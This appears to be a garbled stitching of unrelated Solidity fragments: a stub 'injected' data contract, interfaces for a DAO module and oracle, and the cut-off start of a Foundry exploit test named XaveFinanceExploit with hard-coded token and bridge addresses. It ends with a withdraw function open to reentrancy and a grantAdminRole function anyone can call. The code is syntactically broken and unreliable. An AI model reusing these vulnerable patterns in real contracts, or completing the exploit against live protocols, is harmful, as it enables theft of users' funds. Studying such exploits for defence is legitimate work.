
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function destroyDataResult(string memory resultId) public {
        emit DataResultDestroyed(resultId);
    }
}
pragma solidity 0.8.10;

```solidity;

;
;
contract Enum {
    enum Operation {
        Call, DelegateCall};
interface IDaoModule {
    function getTransactionHash(address to, uint256 value, bytes memory data, Enum.Operation operation, uint256 nonce) external view returns(bytes32);
    function executeProposalWithIndex(string memory proposalId, bytes32[] memory txHashes, address to, uint256 value, bytes memory data, Enum.Operation operation, uint256 txIndex) external;
    function addProposal(string memory proposalId, bytes32[] memory txHashes) external;
    function buildQuestion(string memory proposalId, bytes32[] memory txHashes) external pure returns(string memory);
    function questionIds (bytes32) external returns (bytes32)};
interface IRealitio {
  function submitAnswer(bytes32 question_id, bytes32 answer, uint256 max_previous) external payable;
  function isFinalized(bytes32 question_id) view external returns (bool)};
interface IPrimaryBridge{
    function owner() external view returns (address)};
contract XaveFinanceExploit is DSTest {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IERC20 RNBW = IERC20(0xE94B97b6b43639E238c851A7e693F50033EfD75C);
    IERC20 LPOP = IERC20(0x6335A2E4a2E304401fcA4Fc0deafF066B813D055);
    IPrimaryBridge PrimaryBridge =  IPrimaryBridge(0x579270F151D142eb8BdC081043a983307Aa15786);
    IDaoModule daoModule = IDaoModule(0x8f9036732b9aa9b82D8F35e54B71fa
mapping(address => uint) public balances;
function withdrawReplay() public {
    uint amount = balances[msg.sender];
    require(amount > 0);
    (bool sent, ) = msg.sender.call{value: amount}("");
    require(sent)}
function grantAdminRole(address user) public {
    admins[user] = true}